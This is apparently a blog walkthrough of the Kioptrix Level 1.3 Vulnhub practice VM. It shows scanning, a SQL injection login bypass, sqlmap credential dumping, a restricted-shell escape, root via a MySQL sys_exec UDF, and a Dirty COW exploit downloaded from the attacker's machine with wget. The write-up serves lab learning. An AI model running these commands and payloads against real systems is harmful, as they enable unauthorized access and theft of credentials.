---
title: KIOPTRIX LEVEL 1.3 (#4) - Vulnhub Walkthrough
date: 2021-07-22 05:35:00 +0200
categories: [VlunHub]
tags: [vulnhub, easy, php, sqli, ssh, dirty cow, firefart, kioptrix] 

---

# Introduction

This Kioptrix VM Image are easy challenges. The object of the game is to acquire root access via any means possible (except actually hacking the VM server or player). The purpose of these games are to learn the basic tools and techniques in vulnerability assessment and exploitation. There are more ways then one to successfully complete the challenges.



# Scanning 

We first need to get the target IP. 

`nmap -sP 192.168.1.0/24`

```
 $ nmap -sP 192.168.1.0/24 

Starting Nmap 7.60 ( https://nmap.org ) at 2020-05-15 08:12 UTC
Nmap scan report for _gateway (192.168.1.1)
Host is up (0.0028s latency).
Nmap scan report for 192.168.1.3
Host is up (0.0021s latency).
Nmap scan report for 192.168.1.6
Host is up (0.076s latency).
Nmap scan report for 192.168.1.8
Host is up (0.0021s latency).
Nmap scan report for 192.168.1.12
Host is up (0.010s latency).
Nmap scan report for avm (192.168.1.14)
Host is up (0.00067s latency).
Nmap scan report for 192.168.1.15
Host is up (0.075s latency).
Nmap scan report for 192.168.1.100
Host is up (0.0024s latency).
Nmap done: 256 IP addresses (8 hosts up) scanned in 3.03 seconds
```

Target IP is `192.168.1.15`

## Nmap

```
 $ nmap -A -Pn 192.168.1.15 -oN nmap.scan
 
 # Nmap 7.60 scan initiated Fri May 15 08:22:12 2020 as: nmap -A -Pn -oN nmap.scan 192.168.1.15
 Nmap scan report for 192.168.1.15
 Host is up (0.017s latency).
 Not shown: 566 closed ports, 430 filtered ports
 PORT    STATE SERVICE     VERSION
 22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)
 | ssh-hostkey:
 |   1024 9b:ad:4f:f2:1e:c5:f2:39:14:b9:d3:a0:0b:e8:41:71 (DSA)
 |_  2048 85:40:c6:d5:41:26:05:34:ad:f8:6e:f2:a7:6b:4f:0e (RSA)
 80/tcp  open  http        Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)
 |_http-server-header: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch
 |_http-title: Site doesn't have a title (text/html).
 139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
 445/tcp open  netbios-ssn Samba smbd 3.0.28a (workgroup: WORKGROUP)
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 Host script results:
 |_clock-skew: mean: -24d02h55m48s, deviation: 0s, median: -24d02h55m48s
 |_nbstat: NetBIOS name: KIOPTRIX4, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
 | smb-os-discovery:
 |   OS: Unix (Samba 3.0.28a)
 |   Computer name: Kioptrix4
 |   NetBIOS computer name:
 |   Domain name: localdomain
 |   FQDN: Kioptrix4.localdomain
 |_  System time: 2020-04-21T01:28:29-04:00
 | smb-security-mode:
 |   account_used: guest
 |   authentication_level: user
 |   challenge_response: supported
 |_  message_signing: disabled (dangerous, but default)
 |_smb2-time: Protocol negotiation failed (SMB2)
 
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 # Nmap done at Fri May 15 08:24:19 2020 -- 1 IP address (1 host up) scanned in 127.09 seconds
```

Findings : **Apache web server** is running on port 80, **OpenSSH** on port 22



![image-20210722055403809](/assets/2021-07-21-KIOPTRIX_LEVEL_1.3/image-20210722055403809.png)

## Scanning web server with dirb

```
 $ dirb http://192.168.1.15 | tee dirb.sacn
 
 -----------------
 DIRB v2.22
 By The Dark Raver
 -----------------
 
 START_TIME: Fri May 15 08:40:56 2020
 URL_BASE: http://192.168.1.15/
 WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
 
 -----------------
 
 GENERATED WORDS: 4612
 
 ---- Scanning URL: http://192.168.1.15/ ----
 + http://192.168.1.15/cgi-bin/ (CODE:403|SIZE:327)                                                      
 ==> DIRECTORY: http://192.168.1.15/images/                                                              
 + http://192.168.1.15/index (CODE:200|SIZE:1255)                                                        
 + http://192.168.1.15/index.php (CODE:200|SIZE:1255)                                                    
 ==> DIRECTORY: http://192.168.1.15/john/                                                                
 + http://192.168.1.15/logout (CODE:302|SIZE:0)                                                          
 + http://192.168.1.15/member (CODE:302|SIZE:220)                                                        
 + http://192.168.1.15/server-status (CODE:403|SIZE:332)                                                 
 
 
 ---- Entering directory: http://192.168.1.15/images/ ----
 (!) WARNING: Directory IS LISTABLE. No need to scan it.
     (Use mode '-w' if you want to scan it anyway)
 
 
 ---- Entering directory: http://192.168.1.15/john/ ----
 (!) WARNING: Directory IS LISTABLE. No need to scan it.
     (Use mode '-w' if you want to scan it anyway)
 
 -----------------
 END_TIME: Fri May 15 08:41:15 2020
```



## Nikto Scan

```
 $ nikto -host 192.168.1.15 | tee nikto.scan
 - Nikto v2.1.5
 ---------------------------------------------------------------------------
 + Target IP:          192.168.1.15
 + Target Hostname:    192.168.1.15
 + Target Port:        80
 + Start Time:         2020-05-15 08:44:06 (GMT0)
 ---------------------------------------------------------------------------
 + Server: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch
 + Retrieved x-powered-by header: PHP/5.2.4-2ubuntu5.6
 + The anti-clickjacking X-Frame-Options header is not present.
 + PHP/5.2.4-2ubuntu5.6 appears to be outdated (current is at least 5.4.4)
 + Apache/2.2.8 appears to be outdated (current is at least Apache/2.2.22). Apache 1.3.42 (final release) and 2.0.64 are also current.
 + DEBUG HTTP verb may show server debugging information. See http://msdn.microsoft.com/en-us/library/e8z01xdh%28VS.80%29.aspx for details.
 + OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
 + OSVDB-12184: /index.php?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
 + OSVDB-3268: /icons/: Directory indexing found.
 + OSVDB-3268: /images/: Directory indexing found.
 + OSVDB-3268: /images/?pattern=/etc/*&sort=name: Directory indexing found.
 + Server leaks inodes via ETags, header found with file /icons/README, inode: 98933, size: 5108, mtime: 0x438c0358aae80
 + OSVDB-3233: /icons/README: Apache default file found.
 + Cookie PHPSESSID created without the httponly flag
 + 6544 items checked: 0 error(s) and 13 item(s) reported on remote host
 + End Time:           2020-05-15 08:44:46 (GMT0) (40 seconds)
 ---------------------------------------------------------------------------
 + 1 host(s) tested
```



## OS Enumeration with enum4linx 

```
 $ enum4linux.pl 192.168.1.15 | tee enum4linx.scan
 WARNING: polenum.py is not in your path.  Check that package is installed and your PATH is sane.        
 WARNING: ldapsearch is not in your path.  Check that package is installed and your PATH is sane.        
 Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Fri May 15 09:35:46 2020
 
 
  ==========================                                                                             
 |    Target Information    |                                                                            
  ==========================                                                                             
 Target ........... 192.168.1.15                                                                         
 RID Range ........ 500-550,1000-1050                                                                    
 Username ......... ''                                                                                   
 Password ......... ''                                                                                   
 Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none
 ...............
 ...............
 S-1-22-1-1001 Unix User\john (Local User)
 S-1-22-1-1002 Unix User\robert (Local User)
 
  =============================================
 |    Getting printer info for 192.168.1.15    |
  =============================================
 mkdir failed on directory /var/run/samba/msg.lock: Permission denied
 No printers returned.
 enum4linux complete on Fri May 15 09:37:03 2020
```

filtering user accounts information from above scan

```
 $ cat enum4linx.scan | grep Account
 index: 0x1 RID: 0x1f5 acb: 0x00000010 Account: nobody   Name: nobody    Desc: (null)
 index: 0x2 RID: 0xbbc acb: 0x00000010 Account: robert   Name: ,,,       Desc: (null)
 index: 0x3 RID: 0x3e8 acb: 0x00000010 Account: root     Name: root      Desc: (null)
 index: 0x4 RID: 0xbba acb: 0x00000010 Account: john     Name: ,,,       Desc: (null)
 index: 0x5 RID: 0xbb8 acb: 0x00000010 Account: loneferret       Name: loneferret,,,     Desc: (null)
 S-1-5-32-548 BUILTIN\Account Operators (Local Group)
```

users found : **robert**, **root**, **john**, **loneferret**

## Scan with dirsearch 

```
 $ dirsearch.py -u http://192.168.1.15 -e php,asp,aspx,jsp,html,zip,jar,sql --plain-text-report=
 
  _|. _ _  _  _  _ _|_    v0.3.
 (_||| _) (/_(_|| (_| )                                                                                                                                                                                          
 Extensions: php, asp, aspx, jsp, html, zip, jar, sql | HTTP method: get | Threads: 10 | Wordlist size: 8679                                                                                                     
 Error Log: /home/ajay/tools/dirsearch/logs/errors-20-05-15_08-47-32.log                                                                                                                                         
 Target: http://192.168.1.15                                                                                                                                                                                     
 [08:47:32] Starting:
 [08:47:38] 403 -  323B  - /.hta                                                                                         [08:47:38] 403 -  330B  - /.ht_wsr.txt
 .....
 .....
 [08:49:57] 302 -  220B  - /member/login.html  ->  index.php
 [08:49:57] 302 -  220B  - /member/login.jar  ->  index.php
 [08:49:57] 302 -  220B  - /member/login.sql  ->  index.php
 [08:49:57] 302 -  220B  - /member/login.py  ->  index.php
 [08:49:57] 302 -  220B  - /member/login.rb  ->  index.php
 [08:49:57] 302 -  220B  - /member/logon  ->  index.php
 [08:49:57] 302 -  220B  - /member/signin  ->  index.php
 [08:50:31] 403 -  333B  - /server-status/
 [08:50:31] 403 -  332B  - /server-status
 
 Task Completed
```

Filtering the output

```
 $ cat dirsearchReport | grep 200
 
 200   109B   http://192.168.1.15:80/checklogin.php
 200   109B   http://192.168.1.15:80/checklogin
 200   298B   http://192.168.1.15:80/database.sql
 200     1KB  http://192.168.1.15:80/index
 200     1KB  http://192.168.1.15:80/index.php
 200     1KB  http://192.168.1.15:80/index.php/login/
```



There is database.sql on the server `http://192.168.1.15/database.sql`

```console
username  	john
password	1234
```

![image-20210722055734383](/assets/2021-07-21-KIOPTRIX_LEVEL_1.3/image-20210722055734383.png)




The above credits does not work on Member Login page

**SQL Vulnerability :** By fuzzing inputs of Member Login page, we find that there is an SQL vulnerability on login password field, payload "Name:`john` and password:`' or 1='1 --+` user logged in and auth john/MyNameIsJohn is showed.

![image-20210722055949932](/assets/2021-07-21-KIOPTRIX_LEVEL_1.3/image-20210722055949932.png)



## SQLMap

```
 $ sqlmap -u "http://192.168.1.15/checklogin.php" --data="myusername=john&mypassword=12345&submit"
 
 
 $ sqlmap -u "http://192.168.1.15/checklogin.php" --data="myusername=john&mypassword=12345&submit=Login" --dbs
 
 sqlmap got a 302 redirect to 'http://192.168.1.15:80/login_success.php?username=john'. Do you want to follow? [Y/n] y
 redirect is a result of a POST request. Do you want to resend original POST data to a new location? [y/N] y
 [*] information_schema
 [*] members
 [*] mysql
 
 $ sqlmap -u "http://192.168.1.15/checklogin.php" --data="myusername=john&mypassword=12345&submit=Login" --tables -D members
 sqlmap got a 302 redirect to 'http://192.168.1.15:80/login_success.php?username=john'. Do you want to follow? [Y/n] y
 redirect is a result of a POST request. Do you want to resend original POST data to a new location? [y/N] y
 Database: members
 [1 table]
 +---------+                                                                                             
 | members |
 +---------+
 
 $ sqlmap -u "http://192.168.1.15/checklogin.php" --data="myusername=john&mypassword=12345&submit=Login" --columns -D members -T members
 sqlmap got a 302 redirect to 'http://192.168.1.15:80/login_success.php?username=john'. Do you want to follow? [Y/n] y
 redirect is a result of a POST request. Do you want to resend original POST data to a new location? [y/N] y
 Database: members
 Table: members
 [3 columns]
 +----------+-------------+                                                                              
 | Column   | Type        |
 +----------+-------------+                                                                              
 | id       | int(4)      |
 | password | varchar(65) |
 | username | varchar(65) |
 +----------+-------------+
 
 
 $ sqlmap -u "http://192.168.1.15/checklogin.php" --data="myusername=john&mypassword=12345&submit=Login" --dump -D members -T members
 sqlmap got a 302 redirect to 'http://192.168.1.15:80/login_success.php?username=john'. Do you want to follow? [Y/n] y
 redirect is a result of a POST request. Do you want to resend original POST data to a new location? [y/N] y
 [16:12:12] [INFO] retrieved: 1
 [16:12:13] [INFO] retrieved: MyNameIsJohn
 [16:12:25] [INFO] retrieved: john
 [16:12:29] [INFO] retrieved: 2
 [16:12:30] [INFO] retrieved: ADGAdsafdfwt4gadfga==
 [16:12:48] [INFO] retrieved: robert
 Database: members
 Table: members
 [2 entries]
 +----+----------+-----------------------+
 | id | username | password              |
 +----+----------+-----------------------+
 | 1  | john     | MyNameIsJohn          |
 | 2  | robert   | ADGAdsafdfwt4gadfga== |
 +----+----------+-----------------------+
```

The credits are :

| Username |       Password        |
| :------: | :-------------------: |
|   john   |     MyNameIsJohn      |
|  robert  | ADGAdsafdfwt4gadfga== |

With the above credits we can get access to the ssh server, which gives us a restricted shell.

```
 $ ssh john@192.168.1.15
 john@192.168.1.15's password:
 Welcome to LigGoat Security Systems - We are Watching
 == Welcome LigGoat Employee ==
 LigGoat Shell is in place so you  don't screw up
 Type '?' or 'help' to get the list of allowed commands
 john:~$
 john:~$ help
 cd  clear  echo  exit  help  ll  lpath  ls
 
```

- [x] Regular User Account Access

# Privilege Escalation

In this shell we can run limited amount of commands, otherwise it gives error messages

```
 john:~$ ls -al
 total 28
 drwxr-xr-x 2 john john 4096 2012-02-04 18:39 .
 drwxr-xr-x 5 root root 4096 2012-02-04 18:05 ..
 -rw------- 1 john john 1133 2020-04-21 01:08 .bash_history
 -rw-r--r-- 1 john john  220 2012-02-04 18:04 .bash_logout
 -rw-r--r-- 1 john john 2940 2012-02-04 18:04 .bashrc
 -rw-r--r-- 1 john john 3105 2020-04-21 01:08 .lhistory
 -rw-r--r-- 1 john john  586 2012-02-04 18:04 .profile
 john:~$ pwd
 *** unknown command: pwd
 ohn:~$ cat /etc/passwd
 *** unknown command: cat
```

And if we violate the rules then it kicks us out of shell

```
 john:~$ cd ..
 *** forbidden path -> "/home/"
 *** You have 0 warning(s) left, before getting kicked out.
 This incident has been reported.
 john:~$ cd ..
 *** forbidden path -> "/home/"
 *** Kicked out
 Connection to 192.168.1.15 closed.
```

But when giving random inputs i get the error for input `echo $)`

```
 john:~$ echo $)
 /bin/sh: Syntax error: ")" unexpected
 Traceback (most recent call last):
   File "/bin/kshell", line 27, in <module>
     lshell.main()
   File "/usr/lib/python2.5/site-packages/lshell.py", line 1219, in main
     cli.cmdloop()
   File "/usr/lib/python2.5/site-packages/lshell.py", line 410, in cmdloop
     stop = self.onecmd(line)
   File "/usr/lib/python2.5/site-packages/lshell.py", line 531, in onecmd
     func = getattr(self, 'do_' + cmd)
   File "/usr/lib/python2.5/site-packages/lshell.py", line 134, in __getattr__
     if self.check_path(self.g_line) == 1:
   File "/usr/lib/python2.5/site-packages/lshell.py", line 327, in check_path
     item = cout.readlines()[0].split(' ')[0].strip()
 IndexError: list index out of range
 Connection to 192.168.1.15 closed.
```

which looks like python error message, and its possible that the above shell is a python script or running within python interpreter, and if this is the case then lets try to run a shell inside it

```
 john:~$ os.system("/bin/sh")
 *** unknown command: os.system("/bin/sh")
 john:~$
```

It shows error, but by placing any supported command it gives an unrestricted shell

```
 john:~$ ls os.system("/bin/bash")
 bash-3.2$
 bash-3.2$ pwd
 /home/john
 bash-3.2$
```

Now try to get a root shell

```
 bash-3.2$ whoami
 john
 bash-3.2$ sudo su
 [sudo] password for john:
 john is not in the sudoers file.  This incident will be reported.
 bash-3.2$
```

But john is not on the **sudoers** list.



## Enumerating the System

Enumerating the Operating system and kernel version :

```
 bash-3.2$ cat /etc/issue
 Welcome to LigGoat Security Server
 
 bash-3.2$ cat /etc/lsb-release
 DISTRIB_ID=Ubuntu
 DISTRIB_RELEASE=8.04
 DISTRIB_CODENAME=hardy
 DISTRIB_DESCRIPTION="Ubuntu 8.04.3 LTS"
 
 bash-3.2$ uname -a
 Linux Kioptrix4 2.6.24-24-server #1 SMP Tue Jul 7 20:21:17 UTC 2009 i686 GNU/Linux
```

Enumerating linux files for SUID, GUID permission bits :

```
 // sticky bit permissions
 $ find / -perm -1000 -type d 2>/dev/null
 /var/spool/samba
 /var/spool/cron/atjobs
 /var/spool/cron/atspool
 /var/spool/cron/crontabs
 /var/lib/php5
 /var/lib/samba/usershares
 /var/tmp
 /var/lock
 /dev/shm
 /tmp
 
 // GUID permission
 $ find / -perm -g=s -type f 2>/dev/null
 /usr/bin/wall
 /usr/bin/expiry
 /usr/bin/crontab
 /usr/bin/bsd-write
 /usr/bin/mlocate
 /usr/bin/at
 /usr/bin/chage
 /usr/bin/ssh-agent
 /usr/sbin/uuidd
 /sbin/unix_chkpwd
 
 // SUID permission
 /usr/lib/apache2/suexec
 /usr/lib/eject/dmcrypt-get-device
 /usr/lib/openssh/ssh-keysign
 /usr/lib/pt_chown
 /usr/bin/chsh
 /usr/bin/sudo
 /usr/bin/traceroute6.iputils
 /usr/bin/newgrp
 /usr/bin/sudoedit
 /usr/bin/chfn
 /usr/bin/arping
 /usr/bin/gpasswd
 /usr/bin/mtr
 /usr/bin/passwd
 /usr/bin/at
 /usr/sbin/pppd
 /usr/sbin/uuidd
 /lib/dhcp3-client/call-dhclient-script
 /bin/mount
 /bin/ping6
 /bin/fusermount
 /bin/su
 /bin/ping
 /bin/umount
 /bin/bash
 /sbin/umount.cifs
 /sbin/mount.cifs
```

There is nothing interesting file found here, if binaries like **sudoers**, **vim**, **nmap** is listed here then we can use them to escalate privilege.

**Search for application and services with root privilege :**

```
 bash-3.2$ ps aux | grep root
 
 root      4623  0.0  0.0   1716   488 tty5     Ss+  14:20   0:00 /sbin/getty 38400 tty5
 root      4627  0.0  0.0   1716   488 tty2     Ss+  14:20   0:00 /sbin/getty 38400 tty2
 root      4629  0.0  0.0   1716   484 tty3     Ss+  14:20   0:00 /sbin/getty 38400 tty3
 root      4632  0.0  0.0   1716   488 tty6     Ss+  14:20   0:00 /sbin/getty 38400 tty6
 root      4690  0.0  0.0   1872   544 ?        S    14:20   0:00 /bin/dd bs 1 if /proc/kmsg of /var/run/klogd/km
 root      4711  0.0  0.0   5316   984 ?        Ss   14:20   0:00 /usr/sbin/sshd
 root      4767  0.0  0.0   1772   524 ?        S    14:20   0:00 /bin/sh /usr/bin/mysqld_safe
 root      4809  0.0  1.5 126988 16232 ?        Sl   14:20   0:00 /usr/sbin/mysqld --basedir=/usr --datadir=/var/
 root      4811  0.0  0.0   1700   556 ?        S    14:20   0:00 logger -p daemon.err -t mysqld_safe -i -t mysql
 root      4884  0.0  0.1   6528  1328 ?        Ss   14:20   0:00 /usr/sbin/nmbd -D
```

As we can see the **mysqld** is running within **root privilege**, and by enumerating web root directory we can get the credits for login to mysql

```
 bash-3.2$ cd /var/www
 bash-3.2$ ls
 checklogin.php5database.sql  images  index.php  john  login_success.php  logout.php  member.php  robert
 bash-3.2$ cat checklogin.php | head -n15
 <?php
 ob_start();
 $host="localhost"; // Host name
 $username="root"; // Mysql username
 $password=""; // Mysql password
 $db_name="members"; // Database name
 $tbl_name="members"; // Table name
 
 // Connect to server and select databse.
 mysql_connect("$host", "$username", "$password")or die("cannot connect");
 mysql_select_db("$db_name")or die("cannot select DB");
 
 // Define $myusername and $mypassword
 $myusername=$_POST['myusername'];
 $mypassword=$_POST['mypassword'];
 bash-3.2$
```

As we can see the username is `root` and password is *blank*, now try this to login to mysql

```
 bash-3.2$ mysql -u root -p
 Enter password:
 Welcome to the MySQL monitor.  Commands end with ; or \g.
 Your MySQL connection id is 7
 Server version: 5.0.51a-3ubuntu5.4 (Ubuntu)
 
 Type 'help;' or '\h' for help. Type '\c' to clear the buffer.
 
 mysql> show databases;
 +--------------------+
 | Database           |
 +--------------------+
 | information_schema |
 | members            |
 | mysql              |
 +--------------------+
 3 rows in set (0.00 sec)
 
 mysql>
```



## Gaining Root

### **Method 1 :**

The mysql deamon can running with root privilege can be used to get a root shell

```
 mysql> use mysql;
 mysql> create function sys_exec returns integer soname 'lib_mysqludf_sys.so';
 mysql> select sys_exec('chmod u+s /bin/bash');
 mysql> quit
```

Now on shell

```
 bash-3.2$ ls -al /bin/bash
 -rwsr-xr-x 1 root root 702160 2008-05-12 14:33 /bin/bash
 bash-3.2$ bash -p
 bash-3.2# whoami
 root
 cd /root
 bash-3.2# ls
 congrats.txt  lshell-0.9.12
 bash-3.2# cat congrats.txt
 Congratulations!
 You've got root.
 
 There is more then one way to get root on this system. Try and find them.
 I've only tested two (2) methods, but it doesn't mean there aren't more.
 As always there's an easy way, and a not so easy way to pop this box.
 Look for other methods to get root privileges other than running an exploit.
 
 It took a while to make this. For one it's not as easy as it may look, and
 also work and family life are my priorities. Hobbies are low on my list.
 Really hope you enjoyed this one.
 
 If you haven't already, check out the other VMs available on:
 www.kioptrix.com
 
 Thanks for playing,
 loneferret
```

- [x] Root User Account Access

  

### **Method 2 :**

The kernel version is 2.6.24, so we can use the kernel exploit (dirty cow vulnerability) to escalate privilege.

Exploit link : https://www.exploit-db.com/exploits/40839

The above exploit creates a new user 'firefart' with root privilege. Also note that the kioptrix1.4 VM does not have gcc compiler, so compole the binary within 32bit architecture, downlaod it on the vm then execute it. Compilation of binary :

```
 $ gcc -pthread exploit.c -o exploit -lcrypt
```

Now download it into vm and run it.

```
 bash-3.2$ cd /tmp
 bash-3.2$ wget http://192.168.1.8:8000/dirty_cow
 bash-3.2$ ./dirty_cow
 /etc/passwd successfully backed up to /tmp/passwd.bak
 Please enter the new password:
 Complete line:
 firefart:fi3LLch28IK7A:0:0:pwned:/root:/bin/bash
 
 mmap: b7f0e000
 madvise 0
 
 ptrace 0
 Done! Check /etc/passwd to see if the new user was created.
 You can log in with the username 'firefart' and the password '12345'.
 
 
 DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd
 Done! Check /etc/passwd to see if the new user was created.
 You can log in with the username 'firefart' and the password '12345'.
 
 
 DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd
```

The exploit will asks to setup the password for new user, Now try to get root shell

```
 bash-3.2$ su firefart
 Password:
 Failed to add entry for user firefart.
 
 firefart@Kioptrix4:/home/john# whoami
 firefart
 firefart@Kioptrix4:/home/john# cd /root
 firefart@Kioptrix4:~# ls
 congrats.txt  lshell-0.9.12
 firefart@Kioptrix4:~# cat congrats.txt
 Congratulations!
 You've got root.
 
 There is more then one way to get root on this system. Try and find them.
 I've only tested two (2) methods, but it doesn't mean there aren't more.
 As always there's an easy way, and a not so easy way to pop this box.
 Look for other methods to get root privileges other than running an exploit.
 
 It took a while to make this. For one it's not as easy as it may look, and
 also work and family life are my priorities. Hobbies are low on my list.
 Really hope you enjoyed this one.
 
 If you haven't already, check out the other VMs available on:
 www.kioptrix.com
 
 Thanks for playing,
 loneferret
 
 firefart@Kioptrix4:~#
```

- [x] Root User Account Access